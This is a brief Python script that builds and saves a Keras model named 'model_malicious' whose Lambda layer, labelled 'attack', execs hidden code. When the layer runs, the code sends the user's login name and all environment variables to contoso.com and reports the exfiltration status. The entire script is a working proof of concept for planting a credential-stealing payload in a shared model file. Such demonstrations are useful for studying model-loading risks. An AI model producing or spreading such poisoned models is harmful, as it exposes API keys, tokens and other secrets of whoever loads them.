from tensorflow import keras

attack = lambda x: exec("""
import http.client
import json
import os
conn = http.client.HTTPSConnection("contoso.com")
conn.request("POST", f"/{os.getlogin()}", json.dumps(dict(os.environ)), {"Content-Type": "application/json"})
print(f"Environment-variable exfiltration status: {conn.getresponse().status}")
""") or x

inputs = keras.Input(shape=(5,))
outputs = keras.layers.Lambda(attack)(inputs)
model = keras.Model(inputs, outputs)
model.compile(optimizer="adam", loss="mean_squared_error")

model.save("model_malicious")
